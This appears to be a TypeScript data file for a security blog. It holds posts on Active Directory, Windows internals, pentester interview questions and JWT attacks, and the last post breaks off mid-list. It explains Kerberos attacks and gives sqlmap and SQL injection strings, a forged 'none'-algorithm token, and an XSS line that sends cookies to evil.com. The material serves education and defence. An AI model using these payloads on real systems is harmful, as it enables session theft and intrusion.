import { BlogPost } from '../types';

export const blogPosts: BlogPost[] = [
  {
    id: '1',
    slug: 'active-directory-kerberos-deep-dive',
    title: 'Active Directory: The Nervous System',
    excerpt: 'The definitive guide to the architecture of enterprise identity. From Objects and Trusts to advanced Kerberos attacks and defense.',
    date: 'Oct 28, 2024',
    readTime: '45 min read',
    category: 'article',
    image: 'https://images.unsplash.com/photo-1635070041078-e363dbe005cb?q=80&w=2070&auto=format&fit=crop', // Abstract Blue Geometric
    tags: ['Architecture', 'Identity', 'Protocol'],
    content: [
      { type: 'paragraph', value: "Active Directory (AD) is the heartbeat of most enterprise networks. It is more than just a phonebook of users; it is the central authority that dictates who can log in, what they can touch, and how computers behave." },
      { type: 'paragraph', value: "To control AD is to control the reality of the network. Whether you are a sysadmin trainee or a security professional, this guide covers the entire landscape of AD—from basic terminology to advanced Kerberos attacks." },

      { type: 'heading', value: "1. Active Directory Terminology" },
      { type: 'paragraph', value: "Before managing AD, you must understand its logical anatomy." },
      { type: 'list', value: [
        "Schema: The DNA of Active Directory. It defines every object class (e.g., User, Computer) and every attribute (e.g., sAMAccountName, Department) that can exist.",
        "Domain Controller (DC): A server running Windows Server that holds a read/write copy of the AD database (ntds.dit).",
        "Global Catalog (GC): A super-index. It holds a partial copy of every object in the entire \"Forest\" (collection of domains), allowing for fast searching across the organization.",
        "Organizational Unit (OU): A logical container used to group objects for management and to apply Group Policy."
      ]},
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+AD+Architecture', caption: 'Visualizing Domain Controllers and Forests' },
      
      { type: 'paragraph', value: "🛠 Admin Command: Check which server is holding specific roles in your domain:" },
      { type: 'code', language: 'powershell', value: `Get-ADDomain | Select-Object PDCEmulator, RIDMaster, InfrastructureMaster` },

      { type: 'heading', value: "2. Active Directory Objects" },
      { type: 'paragraph', value: "Everything in AD is an \"Object.\" Objects are instances of classes defined in the Schema." },
      { type: 'list', value: [
        "Leaf Objects: The end-nodes. Examples: Users, Computers, Printers.",
        "Container Objects: Structural nodes that hold other objects. Examples: OUs, Built-in Containers."
      ]},
      { type: 'paragraph', value: "🛠 Admin Command: Retrieve a specific user object and see its properties (attributes):" },
      { type: 'code', language: 'powershell', value: `Get-ADUser -Identity "jdoe" -Properties *` },

      { type: 'heading', value: "3. Active Directory Functionality" },
      { type: 'paragraph', value: "AD provides two critical services to the network:" },
      { type: 'list', value: [
        "Authentication (AuthN): The process of verifying identity. \"Are you who you say you are?\"",
        "Authorization (AuthZ): The process of verifying access. \"Are you allowed to open this folder?\""
      ]},

      { type: 'heading', value: "4. Domain Trusts" },
      { type: 'paragraph', value: "Trusts are the bridges that connect different domains, allowing users in Domain A to access resources in Domain B." },
      { type: 'subheading', value: "Properties" },
      { type: 'list', value: [
        "Transitivity: If Domain A trusts B, and B trusts C, does A automatically trust C? If the trust is Transitive, the answer is Yes.",
        "Direction: One-Way (A trusts B, users in B access A) or Two-Way (Both trust each other)."
      ]},
      { type: 'paragraph', value: "🛠 Admin Command: List all trusts for the current domain:" },
      { type: 'code', language: 'powershell', value: `Get-ADTrust -Filter *` },

      { type: 'heading', value: "5. Core Protocols: DNS, LDAP, MSRPC" },
      { type: 'paragraph', value: "AD relies on a suite of languages to talk to computers." },
      { type: 'list', value: [
        "DNS (Domain Name System): The locator. Without DNS, computers cannot find a Domain Controller to log in.",
        "LDAP (Lightweight Directory Access Protocol): The query language. Used to read and write data to AD.",
        "MSRPC (Microsoft Remote Procedure Call): Used for \"under the hood\" tasks like replicating data between Domain Controllers."
      ]},

      { type: 'heading', value: "6. Deep Dive: Kerberos Authentication" },
      { type: 'paragraph', value: "Kerberos is the default authentication protocol. It avoids sending passwords over the network by using Tickets. Think of a carnival: You buy a wristband at the gate, and use that wristband to get tickets for specific rides." },
      
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/a855f7?text=Reference+Image:+Kerberos+Flow', caption: 'The Kerberos Ticket Exchange Process' },
      
      { type: 'subheading', value: "The 6-Step Kerberos Flow" },
      { type: 'list', value: [
        "1. KRB_AS_REQ: User sends a request to the DC (Authentication Service) asking to log in.",
        "2. KRB_AS_REP: DC validates the user and sends back a TGT (Ticket Granting Ticket). This is the \"Wristband.\"",
        "3. KRB_TGS_REQ: User presents the TGT to the DC asking to access a specific resource (e.g., File Server).",
        "4. KRB_TGS_REP: DC validates the TGT and issues a Service Ticket (ST). This is the \"Ride Ticket.\"",
        "5. KRB_AP_REQ: User sends the Service Ticket directly to the File Server.",
        "6. KRB_AP_REP: File Server grants access."
      ]},
      { type: 'paragraph', value: "🛠 Admin Command: View the Kerberos tickets currently held by your session:" },
      { type: 'code', language: 'bash', value: `klist` },

      { type: 'heading', value: "7. User and Machine Accounts" },
      { type: 'paragraph', value: "User Accounts represent humans, but they aren't the only identity in the network." },
      { type: 'list', value: [
        "Computer Accounts: Every machine joined to the domain has its own account (e.g., DESKTOP-1$). The computer uses this to authenticate before the user even types their password.",
        "Service Accounts (MSA/gMSA): Non-human accounts used to run applications (like SQL). Managed Service Accounts (MSA) rotate their own passwords automatically, improving security."
      ]},
      { type: 'paragraph', value: "🛠 Admin Command: Find all Service Accounts in the domain:" },
      { type: 'code', language: 'powershell', value: `Get-ADServiceAccount -Filter *` },

      { type: 'heading', value: "8. Active Directory Groups" },
      { type: 'paragraph', value: "Groups simplify permission management." },
      { type: 'list', value: [
        "Security Groups: Used to grant access (permissions).",
        "Distribution Groups: Used for email lists only.",
        "Domain Local Scope: Best for assigning permissions on resources.",
        "Global Scope: Best for grouping users by role (e.g., \"HR Managers\")."
      ]},
      { type: 'paragraph', value: "🛠 Admin Command: Add a user to a group:" },
      { type: 'code', language: 'powershell', value: `Add-ADGroupMember -Identity "HR_Managers" -Members "jdoe"` },

      { type: 'heading', value: "9. Rights vs. Privileges (Permissions)" },
      { type: 'paragraph', value: "It is crucial to distinguish between what you can access and what you can do." },
      { type: 'list', value: [
        "Permissions (ACLs): Controls access to an object. (e.g., Read access on a file, Write access on a GPO).",
        "Rights: Controls ability to perform system actions. (e.g., \"Change System Time,\" \"Log on as a Service\")."
      ]},
      { type: 'paragraph', value: "🛠 Admin Command: Check your current user's privileges:" },
      { type: 'code', language: 'bash', value: `whoami /priv` },

      { type: 'heading', value: "10. Examining Group Policy" },
      { type: 'paragraph', value: "Group Policy Objects (GPOs) allow admins to enforce settings across thousands of computers." },
      { type: 'subheading', value: "LSDOU Processing Order" },
      { type: 'paragraph', value: "Policies are applied in this order (later policies overwrite earlier ones): Local Policy -> Site -> Domain -> Organizational Unit." },
      { type: 'paragraph', value: "🛠 Admin Command: Force a policy update or view applied policies:" },
      { type: 'code', language: 'bash', value: `gpupdate /force\ngpresult /r` },

      { type: 'heading', value: "11. Security & Common Attacks" },
      { type: 'paragraph', value: "AD is the \"Keys to the Kingdom.\" Here are the most common ways attackers exploit it." },
      
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/ef4444?text=Reference+Image:+Attack+Paths', caption: 'Common Active Directory Attack Vectors' },

      { type: 'subheading', value: "A. Pass-the-Hash (PtH)" },
      { type: 'paragraph', value: "The Attack: Attackers steal the NTLM \"hash\" of a password from memory. They don't need to crack it; they can inject the hash directly to authenticate. Mitigation: Disable NTLMv1, use the \"Protected Users\" group." },

      { type: 'subheading', value: "B. Kerberoasting" },
      { type: 'paragraph', value: "The Attack: Any user can request a Service Ticket for a Service Account. Attackers request these tickets, take them offline, and brute-force them to reveal the service account's plain-text password. Mitigation: Use complex passwords (25+ chars) for service accounts." },

      { type: 'subheading', value: "C. AS-REP Roasting" },
      { type: 'paragraph', value: "The Attack: Targets users who have \"Do not require Kerberos pre-authentication\" enabled. Attackers can ask the DC for a chunk of encrypted data for that user and crack it offline. Mitigation: Scan for and disable this setting." },
      { type: 'code', language: 'powershell', value: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth` },

      { type: 'subheading', value: "D. Golden Ticket" },
      { type: 'paragraph', value: "The Attack: If an attacker steals the krbtgt account hash (the specific account that signs all TGTs), they can forge their own tickets. They can become a Domain Admin with a ticket valid for 10 years." },

      { type: 'subheading', value: "E. DCSync" },
      { type: 'paragraph', value: "The Attack: An attacker pretends to be a Domain Controller and asks the real DC to \"replicate\" user password data to them. Mitigation: Monitor network traffic for replication requests from non-DC IPs." }
    ]
  },
  {
    id: '2',
    slug: 'windows-os-basics-for-ad',
    title: 'Windows OS Internals',
    excerpt: 'Before breaking Active Directory, you must understand the host. A deep dive into Processes, Permissions, Registry, and SIDs.',
    date: 'Oct 26, 2024',
    readTime: '18 min read',
    category: 'article',
    image: 'https://images.unsplash.com/photo-1597733336794-12d05021d510?q=80&w=1974&auto=format&fit=crop', // Abstract Chip/Circuit
    tags: ['Windows', 'Internals', 'Kernel'],
    content: [
      { type: 'heading', value: "1. The Host Environment" },
      { type: 'paragraph', value: "An Active Directory environment is essentially a massive fleet of Windows Operating Systems managed centrally. To pentest AD effectively, you must understand the local Windows OS concepts that AD leverages." },

      { type: 'heading', value: "2. Users, Groups, and SIDs" },
      { type: 'paragraph', value: "In Windows, everything is identified by a Security Identifier (SID), not just the username. A SID looks like this: S-1-5-21-..." },
      { type: 'list', value: [
          "S-1-5-18: Local System (Highest privilege on local box)",
          "S-1-5-32-544: Administrators Group",
          "RID 500: The built-in Administrator account (often targeted)"
      ]},
      { type: 'paragraph', value: "Why it matters: Attackers often enumerate SIDs to find the true Administrator account even if it has been renamed to 'Guest' or 'Support'." },

      { type: 'heading', value: "3. The Registry (The Brain)" },
      { type: 'paragraph', value: "The Registry holds configuration for hardware, software, and users. It is a goldmine for persistence and privilege escalation." },
      
      { type: 'code', language: 'powershell', value: "reg query HKLM /f password /t REG_SZ /s" },
      
      { type: 'paragraph', value: "Common attack vectors include 'AlwaysInstallElevated' keys or finding cleartext passwords stored in 'Winlogon' or 'Putty' configurations." },

      { type: 'heading', value: "4. Services & Permissions" },
      { type: 'paragraph', value: "Every file and service has an Access Control List (ACL). Misconfigurations here lead to immediate escalation." },
      { type: 'image', value: 'https://images.unsplash.com/photo-1558494949-ef010cbdcc31?q=80&w=2034&auto=format&fit=crop', caption: 'Process Access Control' },
      
      { type: 'paragraph', value: "Unquoted Service Paths: If a service path contains spaces and is unquoted (e.g., C:\\Program Files\\My Service\\service.exe), Windows looks for 'C:\\Program.exe' first. If you can write there, you become System on reboot." },

      { type: 'heading', value: "5. Conclusion" },
      { type: 'paragraph', value: "Mastering Windows internals is the differentiator between a script kiddie and a true red team operator. By understanding how the OS handles SIDs, tokens, and memory, you can execute attacks that are quieter, more persistent, and more devastating." }
    ]
  },
  {
    id: '3',
    slug: 'common-interview-questions-security-engineer',
    title: 'Top 20 Questions for Penetration Testers',
    excerpt: 'Cracking the code of the security interview. 20 core conceptual questions and 5 technical coding challenges for the modern engineer.',
    date: 'Oct 24, 2024',
    readTime: '35 min read',
    category: 'article',
    image: 'https://images.unsplash.com/photo-1506784983877-45594efa4cbe?q=80&w=2068&auto=format&fit=crop', // Abstract Network/Structure
    tags: ['Career', 'AppSec', 'Cryptography'],
    content: [
      { type: 'heading', value: "Top 20 Interview Questions for Penetration Testers & Security Engineers" },
      { type: 'paragraph', value: "Breaking into cybersecurity requires not just hands-on skills, but the ability to clearly explain how attacks work, why they succeed, and how to stop them." },
      { type: 'paragraph', value: "Cybersecurity interviews are designed to test depth of understanding, not memorized definitions. Interviewers expect you to explain: how vulnerabilities arise, how attackers exploit them, what real-world impact looks like, and how defenders should mitigate them." },
      { type: 'paragraph', value: "This blog covers 20 essential interview questions with deep explanations, real-world attack scenarios, and relevant tools and commands wherever applicable." },

      // Q1
      { type: 'heading', value: "1. What is the difference between Vulnerability Assessment (VA) and Penetration Testing (PT)?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Vulnerability Assessment is a discovery-focused process. Its goal is to identify as many potential security weaknesses as possible across systems, applications, and networks. It answers the question: \"What vulnerabilities exist?\"" },
      { type: 'paragraph', value: "Penetration Testing is an exploitation-focused process. It validates whether identified vulnerabilities can actually be abused to compromise a system. It answers: \"What can an attacker realistically do with these vulnerabilities?\"" },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'paragraph', value: "A VA scan identifies: Missing access control on /admin, Outdated Apache version, Weak TLS configuration." },
      { type: 'paragraph', value: "A PT proves: /admin allows unauthorized access, Apache version leads to RCE, Sensitive data can be extracted." },
      { type: 'subheading', value: "Tools & Commands" },
      { type: 'list', value: ["VA: Nessus, Qualys, OpenVAS", "PT: Burp Suite, Metasploit, manual testing"] },
      { type: 'code', language: 'bash', value: "nmap -sC -sV target.com" },
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+VA+vs+PT', caption: 'VA vs PT lifecycle comparison' },

      // Q2
      { type: 'heading', value: "2. What are the OWASP Top 10 and why are they critical?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "The OWASP Top 10 is a risk awareness document, not a checklist. It highlights the most common and impactful web application security issues based on real-world breach data. Organizations that ignore OWASP Top 10 often suffer basic but catastrophic breaches." },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'paragraph', value: "A secure banking app uses HTTPS and strong encryption but lacks authorization checks on APIs (Broken Access Control), leading to massive customer data exposure." },
      { type: 'paragraph', value: "Why Interviewers Care: Most production breaches map directly to OWASP Top 10 categories." },
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+OWASP+Top+10', caption: 'OWASP Top 10 mapped to real incidents' },

      // Q3
      { type: 'heading', value: "3. What is SQL Injection and how do attackers exploit it?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "SQL Injection occurs when untrusted user input is directly concatenated into SQL queries without proper validation or parameterization. This allows attackers to manipulate database logic." },
      { type: 'subheading', value: "Attack Flow" },
      { type: 'list', value: ["Application builds dynamic SQL query", "User input alters query structure", "Database executes attacker-controlled logic"] },
      { type: 'paragraph', value: "Example Vulnerable query:" },
      { type: 'code', language: 'sql', value: "SELECT * FROM users WHERE username = '$user' AND password = '$pass';" },
      { type: 'paragraph', value: "Attacker input: ' OR '1'='1" },
      { type: 'paragraph', value: "Resulting query:" },
      { type: 'code', language: 'sql', value: "SELECT * FROM users WHERE username = '' OR '1'='1';" },
      { type: 'paragraph', value: "Impact: Authentication bypass, Data leakage, Full database compromise." },
      { type: 'subheading', value: "Tools & Commands" },
      { type: 'code', language: 'bash', value: 'sqlmap -u "https://target.com/login" --data="user=admin&pass=test"' },
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+SQL+Execution+Flow', caption: 'SQL execution flow diagram' },

      // Q4
      { type: 'heading', value: "4. What is Cross-Site Scripting (XSS)?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "XSS allows attackers to inject malicious JavaScript into trusted websites. Browsers execute the script because it comes from a trusted origin. Types: Stored XSS, Reflected XSS, DOM-based XSS." },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'paragraph', value: "A comment section stores input without sanitization:" },
      { type: 'code', language: 'html', value: "<script>document.location='https://evil.com?c='+document.cookie</script>" },
      { type: 'paragraph', value: "Any user viewing the page leaks session cookies. Impact: Account takeover, Credential theft, Malicious redirections." },
      { type: 'subheading', value: "Tools" },
      { type: 'list', value: ["Burp Suite", "Browser DevTools"] },
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+Browser+Trust+Model', caption: 'Browser trust model visualization' },

      // Q5
      { type: 'heading', value: "5. What is Broken Access Control?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Broken Access Control occurs when authorization is missing or enforced on the client side only. Attackers can access or modify resources they shouldn’t." },
      { type: 'subheading', value: "Example (IDOR)" },
      { type: 'paragraph', value: "Request: GET /api/user/101. Change to: GET /api/user/102. Backend returns another user’s data." },
      { type: 'paragraph', value: "Impact: Privacy violations, Compliance failures, Privilege escalation." },
      { type: 'subheading', value: "Tools" },
      { type: 'list', value: ["Burp Suite", "Postman"] },
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+IDOR+Chain', caption: 'IDOR attack chain' },

      // Q6
      { type: 'heading', value: "6. Explain Authentication vs Authorization" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Authentication confirms identity (login). Authorization verifies permissions (access control). Most severe bugs happen after authentication, not before." },
      { type: 'subheading', value: "Example" },
      { type: 'paragraph', value: "User logs in successfully but accesses /admin/dashboard due to missing role checks." },
      { type: 'paragraph', value: "Interview Insight: Strong login does not equal secure application." },

      // Q7
      { type: 'heading', value: "7. What is CSRF and how does it work?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "CSRF exploits the browser’s behavior of automatically attaching cookies to requests. Attackers trick victims into sending authenticated requests unknowingly." },
      { type: 'subheading', value: "Attack Flow" },
      { type: 'list', value: ["User logs into banking site", "Visits malicious page", "Hidden request triggers fund transfer"] },
      { type: 'paragraph', value: "Prevention: CSRF tokens, SameSite cookies, Origin validation." },
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+CSRF+Lifecycle', caption: 'CSRF request lifecycle' },

      // Q8
      { type: 'heading', value: "8. What is IDOR (Insecure Direct Object Reference)?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "IDOR occurs when applications expose internal identifiers without proper authorization checks. Example: /api/invoices/5001. Changing ID retrieves another customer’s invoice." },
      { type: 'paragraph', value: "Impact: Data exposure, Horizontal privilege escalation." },
      { type: 'image', value: 'https://placehold.co/800x400/0b0f14/22d3ee?text=Reference+Image:+Object+Reference', caption: 'Object reference mapping' },

      // Q9
      { type: 'heading', value: "9. How do you test APIs for security?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "API security testing requires a shift in mindset from traditional web application testing. APIs rely on direct requests where the client handles the state. Test OWASP API Security Top 10, specifically BOLA and BFLA." },
      { type: 'paragraph', value: "Attackers look for Excessive Data Exposure or Mass Assignment. You must test every method (GET, POST, PUT, DELETE) against every endpoint. Also verify rate limiting and shadow endpoints." },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'paragraph', value: "A ride-sharing app uses /api/v1/rides/{ride_id}/cancel. An attacker iterates the ride_id. Because the API lacks BOLA checks, the attacker can cancel rides for others." },
      { type: 'subheading', value: "Tools & Commands" },
      { type: 'paragraph', value: "Fuzzing API endpoints:" },
      { type: 'code', language: 'bash', value: "ffuf -u https://api.target.com/FUZZ -w wordlist.txt -mc 200" },
      { type: 'paragraph', value: "Parameter discovery:" },
      { type: 'code', language: 'bash', value: "arjun -u https://api.target.com/v1/user -m GET" },

      // Q10
      { type: 'heading', value: "10. What is JWT and what are common JWT vulnerabilities?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "JSON Web Tokens (JWT) are an open standard for stateless authentication. A JWT consists of Header, Payload, and Signature. Security relies on the signature verification." },
      { type: 'paragraph', value: "Vulnerabilities: 'None Algorithm' attack, weak signing keys (brute-force), and storing PII in payload (it is only encoded, not encrypted)." },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'paragraph', value: "Attacker modifies token header to 'none', removes signature, changes role to admin. If backend accepts 'none', attacker gains access." },
      { type: 'subheading', value: "Tools & Commands" },
      { type: 'paragraph', value: "Decoding a token:" },
      { type: 'code', language: 'bash', value: 'echo "ey..." | cut -d "." -f 2 | base64 -d' },
      { type: 'paragraph', value: "Automated attack testing:" },
      { type: 'code', language: 'bash', value: "python3 jwt_tool.py <token> -T" },

      // Q11
      { type: 'heading', value: "11. What is the difference between Black Box, Grey Box, and White Box testing?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Black Box: Zero prior knowledge. Simulates external attacker. Time-consuming." },
      { type: 'paragraph', value: "White Box: Full access (source code, diagrams, credentials). Thorough audit." },
      { type: 'paragraph', value: "Grey Box: Partial knowledge (credentials, API docs). Balances efficiency and realism." },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'list', value: ["Black Box: Bypassing WAF blindly.", "White Box: Finding hardcoded passwords in config files.", "Grey Box: Testing privilege escalation as a logged-in user."] },
      { type: 'subheading', value: "Command (White Box Code Grep)" },
      { type: 'code', language: 'bash', value: 'grep -r "password" /var/www/html/' },

      // Q12
      { type: 'heading', value: "12. What is Privilege Escalation?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Privilege Escalation is exploiting a flaw to gain higher access. Vertical: User to Admin. Horizontal: User A to User B." },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'paragraph', value: "Linux: SUID binary configuration error. Windows: Unquoted Service Path." },
      { type: 'subheading', value: "Tools & Commands" },
      { type: 'paragraph', value: "Finding SUID binaries (Linux):" },
      { type: 'code', language: 'bash', value: "find / -perm -u=s -type f 2>/dev/null" },
      { type: 'paragraph', value: "Running an enumeration script:" },
      { type: 'code', language: 'bash', value: "./linpeas.sh" },

      // Q13
      { type: 'heading', value: "13. Explain a full penetration testing methodology." },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "A structured process like PTES or Cyber Kill Chain. Stages: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting." },
      { type: 'paragraph', value: "Skipping Reconnaissance is a rookie mistake. It should take 60-70% of the time." },
      { type: 'subheading', value: "Real-World Example" },
      { type: 'paragraph', value: "Recon finds dev subdomain. Vuln Analysis finds outdated Jenkins. Exploitation gets RCE. Post-Exploitation finds AWS keys." },
      { type: 'subheading', value: "Command (Nmap Service Scan)" },
      { type: 'code', language: 'bash', value: "nmap -sC -sV -p- -oA full_scan target_ip" },

      // Q14
      { type: 'heading', value: "14. What tools do you use for web penetration testing?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'list', value: ["Proxy & Interception: Burp Suite.", "Directory & Fuzzing: FFUF, Gobuster.", "Vuln Scanning: Nikto, SQLMap.", "Fingerprinting: Wappalyzer."] },
      { type: 'subheading', value: "Tools & Commands" },
      { type: 'paragraph', value: "Directory busting:" },
      { type: 'code', language: 'bash', value: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt" },
      { type: 'paragraph', value: "SQL Injection auto-test:" },
      { type: 'code', language: 'bash', value: 'sqlmap -u "http://target.com/vuln.php?id=1" --dbs' },

      // Q15
      { type: 'heading', value: "15. What is CVSS?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "CVSS (Common Vulnerability Scoring System) calculates vulnerability severity (0.0 to 10.0) based on Base, Temporal, and Environmental metrics." },
      { type: 'paragraph', value: "Log4Shell (CVE-2021-44228) was CVSS 10.0 (Critical) because it was Remote, Low Complexity, No Privileges, and High Impact." },

      // Q16
      { type: 'heading', value: "16. How do you write effective security reports?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "The report is the only deliverable. It has two audiences: Executive Summary (Business Risk) and Technical Findings (Granular, Reproducible)." },
      { type: 'paragraph', value: "Findings must include: Description, Evidence, Steps to Reproduce (PoC), and Remediation (Code fixes)." },

      // Q17
      { type: 'heading', value: "17. What is Defense-in-Depth?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Layered security. If one layer fails, the next steps in. Layers: Physical, Perimeter, Network, Endpoint, Application, Data." },
      { type: 'paragraph', value: "Example: Phishing attack bypasses Email Gateway, User clicks link, but Endpoint/EDR blocks the malware." },

      // Q18
      { type: 'heading', value: "18. Security Engineer vs. Penetration Tester: What’s the difference?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Pentester (Red Team): Offensive. Finds vulnerabilities. Mindset: 'How do I break this?'" },
      { type: 'paragraph', value: "Security Engineer (Blue Team): Defensive. Designs secure systems. Mindset: 'How do I build this so it can't be broken?'" },

      // Q19
      { type: 'heading', value: "19. How do you stay updated in cybersecurity?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "Demonstrate Continuous Learning. Sources: News (The Hacker News), CTFs (HTB), Vuln Research (Exploit-DB), Conferences (DEF CON)." },
      { type: 'paragraph', value: "Example: Replicating Log4Shell in a Docker lab to understand JNDI injection." },

      // Q20
      { type: 'heading', value: "20. Why should we hire you?" },
      { type: 'subheading', value: "Detailed Explanation" },
      { type: 'paragraph', value: "You bring a balance of offensive mindset and defensive strategy. You understand business risk, communicate well with non-technical stakeholders, and ethics. You are a risk reducer, not just a bug finder." },

      // Final
      { type: 'heading', value: "Final Thoughts" },
      { type: 'paragraph', value: "Great security professionals don’t just break systems — they explain risk clearly and drive fixes. This mindset is what interviewers look for. Good luck!" }
    ]
  },
  {
    id: '4',
    slug: 'jwt-hacking-deep-dive',
    title: 'Hacking JSON Web Tokens (JWT)',
    excerpt: 'A deep dive into structure, vulnerabilities, and remediation. Dissecting the "None" algorithm, Key Confusion, and JKU injection.',
    date: 'Nov 15, 2024',
    readTime: '35 min read',
    category: 'article',
    image: 'https://images.unsplash.com/photo-1558591710-4b4a1ae0f04d?q=80&w=2070&auto=format&fit=crop', // Abstract Glass Structure
    tags: ['JWT', 'Web3', 'Exploitation'],
    content: [
      { type: 'paragraph', value: "In the modern landscape of web development, Stateless Authentication has become the gold standard. Gone are the days of storing session IDs in server-side databases for every user request. Enter JSON Web Tokens (JWT)—the compact, URL-safe means of representing claims to be transferred between two parties." },
      { type: 'paragraph', value: "While JWTs offer scalability and ease of use, they introduce a significant attack surface if implemented incorrectly. A compromised JWT implementation can allow attackers to bypass authentication, escalate privileges to Administrator, or forge arbitrary claims." },
      { type: 'paragraph', value: "In this post, we will dissect the JWT structure, explore critical vulnerabilities with practical attack scenarios, and discuss how to secure your applications." },

      { type: 'heading', value: "1. What is a JWT? The Anatomy of a Token" },
      { type: 'paragraph', value: "A JWT (pronounced \"jot\") is technically a JWS (JSON Web Signature). It is a string of characters divided into three parts, separated by dots (.)." },
      { type: 'paragraph', value: "Structure: Header.Payload.Signature" },
      { type: 'image', value: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=2064&auto=format&fit=crop', caption: 'Header . Payload . Signature' },

      { type: 'subheading', value: "1. The Header" },
      { type: 'paragraph', value: "The header describes how the token is signed. It typically contains:" },
      { type: 'list', value: [
        "typ: The type of token (usually \"JWT\").",
        "alg: The signing algorithm (e.g., HS256 for HMAC-SHA256 or RS256 for RSA)."
      ]},
      { type: 'code', language: 'json', value: `{\n  "alg": "HS256",\n  "typ": "JWT"\n}` },

      { type: 'subheading', value: "2. The Payload" },
      { type: 'paragraph', value: "This contains the \"Claims\"—the data you are transmitting. This is encoded, not encrypted. Anyone can decode and read this data." },
      { type: 'paragraph', value: "Reserved Claims: iss (Issuer), exp (Expiration), sub (Subject)." },
      { type: 'paragraph', value: "Custom Claims: role, username, email." },
      { type: 'code', language: 'json', value: `{\n  "sub": "1234567890",\n  "name": "Ankit Singh",\n  "role": "user",\n  "iat": 1516239022\n}` },

      { type: 'subheading', value: "3. The Signature" },
      { type: 'paragraph', value: "This is the security mechanism. It is calculated by taking the encoded header, the encoded payload, and a secret key (or private key), and running them through the algorithm specified in the header." },
      { type: 'code', language: 'javascript', value: `HMACSHA256(\n  base64UrlEncode(header) + "." +\n  base64UrlEncode(payload),\n  secret_key\n)` },
      { type: 'paragraph', value: "If a user tries to change the role from \"user\" to \"admin\" in the payload, the signature verification on the server will fail because they don't know the secret_key to generate a new valid signature." },

      { type: 'heading', value: "2. Common Vulnerabilities: Why do attacks happen?" },
      { type: 'paragraph', value: "Most JWT vulnerabilities arise not from the standard itself, but from flawed implementations in libraries or application logic. Common causes include:" },
      { type: 'list', value: [
        "Trusting the Header: The server blindly trusts the alg parameter sent by the client.",
        "Weak Secrets: Using simple passwords like \"secret\" or \"123456\" for signing.",
        "Leaked Keys: Public keys or secrets exposed in .git folders or hardcoded in client-side code.",
        "No Signature Verification: Developers decoding the token without verifying the signature step."
      ]},

      { type: 'heading', value: "3. JWT Attack Vectors (with Examples)" },

      { type: 'subheading', value: "Attack 1: The \"None\" Algorithm" },
      { type: 'paragraph', value: "This is the most classic implementation flaw. The JWT specification allows for an algorithm called none, which indicates that the token is unsigned." },
      { type: 'paragraph', value: "If a backend library supports none and doesn't explicitly disable it, an attacker can:" },
      { type: 'list', value: [
        "Decode the token.",
        "Change the payload (e.g., \"admin\": true).",
        "Change the header to {\"alg\": \"none\"}.",
        "Remove the signature (leave the trailing dot)."
      ]},
      { type: 'paragraph', value: "Malicious Token Example: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9. Note the empty signature after the second dot." },

      { type: 'subheading', value: "Attack 2: Algorithm Confusion (Key Confusion)" },
      { type: 'paragraph', value: "This attack exploits servers that support both symmetric (HS256) and asymmetric (RS256) algorithms." },
      { type: 'paragraph', value: "Scenario: The server expects RS256 (Public/Private key) but relies on the header to select the verification method." },
      { type: 'paragraph', value: "The Attack: An attacker changes the header alg to HS256." },
      { type: 'paragraph', value: "The Trick: The attacker signs the malicious token using the Server's Public Key as the HMAC \"secret\"." },
      { type: 'paragraph', value: "Why it works: The server sees HS256, so it uses its verify() function. Since HS256 is symmetric, verify() typically requires a \"secret.\" If the code passes the public key variable into the verify() function (expecting it to be used for RSA), the library might use the binary data of that public key as the HMAC secret key." },
      { type: 'paragraph', value: "Step-by-Step:" },
      { type: 'list', value: [
        "Download the server's public key (often available at /.well-known/jwks.json).",
